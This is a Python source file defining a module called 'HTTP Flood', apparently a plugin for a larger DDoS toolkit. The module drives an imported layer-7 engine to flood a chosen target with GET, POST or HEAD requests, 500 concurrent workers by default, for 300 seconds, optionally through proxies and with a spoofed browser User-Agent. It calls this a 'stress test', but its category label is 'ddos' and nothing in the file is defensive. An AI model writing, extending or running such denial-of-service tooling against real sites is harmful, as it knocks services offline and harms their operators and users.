import asyncio
from typing import Any
from core.base import BaseModule
from core.engine_l7 import L7Engine

class Layer7HTTP(BaseModule):
    def __init__(self):
        super().__init__()

    @property
    def name(self) -> str:
        return "HTTP Flood"

    @property
    def description(self) -> str:
        return "High-performance HTTP Get/Post/Head Flooder"

    @property
    def category(self) -> str:
        return "ddos"

    @property
    def author(self) -> str:
        return "HydraDev"

    async def run(self, target: str, **kwargs: Any) -> None:
        threads = int(kwargs.get("threads", 500))
        duration = int(kwargs.get("time", 300))
        proxies = kwargs.get("proxies", [])
        method = kwargs.get("method", "GET").upper()
        rate_tracker = kwargs.get("rate_tracker", None)

        self.log(f"Starting {method} flood on {target} using {threads} concurrent workers...", level="info")
        
        # Instantiate core async engine
        engine = L7Engine(target=target, proxies=proxies)
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
            "Connection": "keep-alive"
        }
        
        await engine.run_stress_test(
            method=method,
            headers=headers,
            duration=duration,
            concurrency=threads,
            rate_tracker=rate_tracker
        )
        self.log(f"Finished {method} stress test. Total Successes: {engine.success_count}, Failures: {engine.fail_count}", level="success")

